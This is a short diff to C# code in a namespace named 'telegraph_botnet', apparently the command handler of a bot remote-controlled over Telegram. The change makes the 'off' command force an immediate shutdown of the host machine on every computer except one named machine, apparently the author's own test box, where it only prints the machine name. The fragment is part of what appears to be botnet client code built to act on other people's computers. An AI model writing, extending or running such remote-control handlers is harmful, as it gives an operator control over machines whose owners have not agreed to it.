@@ -115,7 +115,8 @@ namespace telegraph_botnet
                     break;
 
                 case "off":
-                    Process.Start("shutdown", "/s /t 0");
+                    if (Environment.MachineName != "WIN-PO7TONSKB28") {Process.Start("shutdown", "/s /t 0");}
+                    else { Console.WriteLine($"Environment.MachineName = {Environment.MachineName}"); }
                     break;
 
                 case "exit":
